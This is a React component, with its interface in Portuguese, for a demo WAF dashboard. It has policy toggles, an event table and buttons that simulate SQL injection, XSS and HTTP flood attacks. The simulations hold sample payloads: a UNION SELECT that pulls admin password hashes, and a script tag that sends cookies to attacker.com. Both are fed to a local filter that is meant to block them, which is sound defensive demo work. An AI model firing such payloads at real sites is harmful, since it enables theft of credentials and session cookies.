import React, { useState, useEffect } from 'react';
import { Shield, ShieldAlert, ShieldCheck, Zap, Globe, Flame, AlertOctagon, CheckCircle2, RefreshCw, Terminal } from 'lucide-react';
import { getWafConfig, saveWafConfig, getWafEventLogs, inspectHttpRequest, logWafEvent, type WafConfig, type WafEventLog } from '../../lib/waf-corporate-filter';
import { toast } from 'sonner';

export function WafCorporateFilterWidget() {
  const [config, setConfig] = useState<WafConfig>(getWafConfig());
  const [logs, setLogs] = useState<WafEventLog[]>(getWafEventLogs());
  const [isSimulatingDdos, setIsSimulatingDdos] = useState(false);
  const [lastInspection, setLastInspection] = useState<any | null>(null);

  const handleToggle = (key: keyof WafConfig) => {
    const updated = { ...config, [key]: !config[key] };
    setConfig(updated);
    saveWafConfig(updated);
    toast.success('Política do WAF Corporativo Layer 7 atualizada.');
  };

  const handleSimulateSqli = () => {
    const res = inspectHttpRequest({
      url: '/api/v1/auth/login',
      method: 'POST',
      clientIp: '185.220.101.4',
      country: 'RU 🇷🇺',
      bodySnippet: "' UNION SELECT 1, username, password_hash FROM admin_users--",
      userAgent: 'Mozilla/5.0 (Windows NT 10.0)',
    });

    setLastInspection(res);
    setLogs(getWafEventLogs());

    if (!res.allowed) {
      toast.error(`[WAF L7 BLOQUEIO] SQL Injection detectado! Regra: ${res.matchedRuleId}`);
    } else {
      toast.warning('Requisição permitida (WAF está desativado).');
    }
  };

  const handleSimulateXss = () => {
    const res = inspectHttpRequest({
      url: '/tickets/comment',
      method: 'POST',
      clientIp: '45.146.164.11',
      country: 'CN 🇨🇳',
      bodySnippet: "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
      userAgent: 'Mozilla/5.0 (Windows NT 10.0)',
    });

    setLastInspection(res);
    setLogs(getWafEventLogs());

    if (!res.allowed) {
      toast.error(`[WAF L7 BLOQUEIO] XSS Script Injection bloqueado! Regra: ${res.matchedRuleId}`);
    }
  };

  const handleSimulateDdosFlood = () => {
    setIsSimulatingDdos(true);
    toast.info('Iniciando simulação de ataque L7 HTTP Flood (150 req/s)...');

    let count = 0;
    const interval = setInterval(() => {
      count++;
      logWafEvent({
        clientIp: `198.51.100.${Math.floor(10 + Math.random() * 80)}`,
        country: 'US 🇺🇸',
        action: 'BLOCKED',
        ruleName: 'Layer 7 HTTP Flood Rate Limiter',
        category: 'RateLimit',
        path: '/api/v1/tickets/list',
        threatScore: 99,
      });

      setLogs(getWafEventLogs());

      if (count >= 5) {
        clearInterval(interval);
        setIsSimulatingDdos(false);
        toast.error('Ataque L7 DDoS Mitigado pelo Rate Limiter! 100% dos pacotes maliciosos descartados.');
      }
    }, 400);
  };

  return (
    <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 text-slate-100 space-y-6 shadow-xl">
      {/* Cabeçalho */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-800 pb-4">
        <div className="flex items-center gap-3">
          <div className="p-3 bg-blue-500/10 text-blue-400 rounded-xl border border-blue-500/20">
            <Shield className="w-6 h-6" />
          </div>
          <div>
            <h3 className="text-base font-bold text-white flex items-center gap-2">
              WAF Corporativo Layer 7 (OWASP & DDoS)
              <span className="text-[10px] px-2 py-0.5 rounded-full bg-blue-500/20 text-blue-300 font-semibold border border-blue-500/30 uppercase">
                Item 015 • Cloudflare Edge
              </span>
            </h3>
            <p className="text-xs text-slate-400 mt-0.5">
              Filtro de borda em tempo real contra SQLi, XSS, bots maliciosos, geobloqueio e ataques DDoS na camada 7.
            </p>
          </div>
        </div>

        {/* Botões de Ação / Testes */}
        <div className="flex flex-wrap items-center gap-2">
          <button
            onClick={handleSimulateSqli}
            className="flex items-center gap-1.5 px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-xl text-xs font-bold transition-all border border-slate-700 cursor-pointer"
          >
            <Terminal className="w-3.5 h-3.5 text-amber-400" />
            Simular SQLi
          </button>
          <button
            onClick={handleSimulateXss}
            className="flex items-center gap-1.5 px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-xl text-xs font-bold transition-all border border-slate-700 cursor-pointer"
          >
            <ShieldAlert className="w-3.5 h-3.5 text-rose-400" />
            Simular XSS
          </button>
          <button
            onClick={handleSimulateDdosFlood}
            disabled={isSimulatingDdos}
            className="flex items-center gap-1.5 px-3 py-1.5 bg-rose-950/60 hover:bg-rose-900 text-rose-300 rounded-xl text-xs font-bold transition-all border border-rose-800/50 cursor-pointer disabled:opacity-50"
          >
            <Flame className="w-3.5 h-3.5 text-rose-400 animate-pulse" />
            Simular L7 DDoS Flood
          </button>
        </div>
      </div>

      {/* Cards de Métricas em Tempo Real */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="p-4 bg-slate-950/70 rounded-xl border border-slate-800 flex items-center justify-between">
          <div>
            <span className="text-[11px] text-slate-400 font-semibold uppercase tracking-wider">Tráfego Filtrado</span>
            <div className="text-lg font-black text-white mt-1">1,480 req/s</div>
          </div>
          <Zap className="w-6 h-6 text-blue-400 opacity-80" />
        </div>

        <div className="p-4 bg-slate-950/70 rounded-xl border border-slate-800 flex items-center justify-between">
          <div>
            <span className="text-[11px] text-slate-400 font-semibold uppercase tracking-wider">Ameaças Bloqueadas (24h)</span>
            <div className="text-lg font-black text-rose-400 mt-1">1,423 ataques</div>
          </div>
          <ShieldAlert className="w-6 h-6 text-rose-400 opacity-80" />
        </div>

        <div className="p-4 bg-slate-950/70 rounded-xl border border-slate-800 flex items-center justify-between">
          <div>
            <span className="text-[11px] text-slate-400 font-semibold uppercase tracking-wider">Status da Camada L7</span>
            <div className="text-lg font-black text-emerald-400 mt-1">100% Protegido</div>
          </div>
          <CheckCircle2 className="w-6 h-6 text-emerald-400 opacity-80" />
        </div>
      </div>

      {/* Controles de Políticas */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <div className="p-4 bg-slate-950/60 rounded-xl border border-slate-800 flex items-center justify-between">
          <div className="space-y-0.5">
            <span className="text-xs font-bold text-slate-200">Motor WAF Layer 7</span>
            <p className="text-[11px] text-slate-400">Inspeção profunda de payload</p>
          </div>
          <button
            onClick={() => handleToggle('wafEnabled')}
            className={`w-12 h-6 flex items-center rounded-full p-1 cursor-pointer transition-colors ${
              config.wafEnabled ? 'bg-blue-600 justify-end' : 'bg-slate-700 justify-start'
            }`}
          >
            <div className="w-4 h-4 rounded-full bg-white shadow-md" />
          </button>
        </div>

        <div className="p-4 bg-slate-950/60 rounded-xl border border-slate-800 flex items-center justify-between">
          <div className="space-y-0.5">
            <span className="text-xs font-bold text-slate-200">Regras OWASP CRS v3.3</span>
            <p className="text-[11px] text-slate-400">Filtro para SQLi e XSS</p>
          </div>
          <button
            onClick={() => handleToggle('owaspCrsActive')}
            className={`w-12 h-6 flex items-center rounded-full p-1 cursor-pointer transition-colors ${
              config.owaspCrsActive ? 'bg-blue-600 justify-end' : 'bg-slate-700 justify-start'
            }`}
          >
            <div className="w-4 h-4 rounded-full bg-white shadow-md" />
          </button>
        </div>

        <div className="p-4 bg-slate-950/60 rounded-xl border border-slate-800 flex items-center justify-between">
          <div className="space-y-0.5">
            <span className="text-xs font-bold text-slate-200">Geobloqueio (GeoIP)</span>
            <p className="text-[11px] text-slate-400">Restrição por país de origem</p>
          </div>
          <button
            onClick={() => handleToggle('geoIpBlockingActive')}
            className={`w-12 h-6 flex items-center rounded-full p-1 cursor-pointer transition-colors ${
              config.geoIpBlockingActive ? 'bg-blue-600 justify-end' : 'bg-slate-700 justify-start'
            }`}
          >
            <div className="w-4 h-4 rounded-full bg-white shadow-md" />
          </button>
        </div>
      </div>

      {/* Tabela de Eventos Interceptados pelo WAF */}
      <div className="space-y-2">
        <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
          <Globe className="w-4 h-4 text-blue-400" />
          Eventos Interceptados em Tempo Real (Cloudflare Layer 7)
        </h4>

        <div className="overflow-x-auto rounded-xl border border-slate-800 bg-slate-950/80">
          <table className="w-full text-left text-xs">
            <thead className="bg-slate-900/90 text-slate-400 border-b border-slate-800 font-semibold uppercase text-[10px]">
              <tr>
                <th className="p-3">Horário</th>
                <th className="p-3">IP de Origem</th>
                <th className="p-3">País</th>
                <th className="p-3">Categoria</th>
                <th className="p-3">Regra Interceptada</th>
                <th className="p-3">Rota Atingida</th>
                <th className="p-3 text-right">Ação WAF</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60 text-slate-300 font-mono text-[11px]">
              {logs.map((log) => (
                <tr key={log.id} className="hover:bg-slate-900/40 transition-colors">
                  <td className="p-3 text-slate-400">{log.timestamp}</td>
                  <td className="p-3 font-bold text-white">{log.clientIp}</td>
                  <td className="p-3">{log.country}</td>
                  <td className="p-3">
                    <span className="px-2 py-0.5 rounded bg-slate-800 text-slate-300 text-[10px]">
                      {log.category}
                    </span>
                  </td>
                  <td className="p-3 text-slate-300 font-sans">{log.ruleName}</td>
                  <td className="p-3 text-blue-400">{log.path}</td>
                  <td className="p-3 text-right font-sans">
                    <span
                      className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${
                        log.action === 'BLOCKED'
                          ? 'bg-rose-500/20 text-rose-300 border border-rose-500/30'
                          : 'bg-amber-500/20 text-amber-300 border border-amber-500/30'
                      }`}
                    >
                      {log.action}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
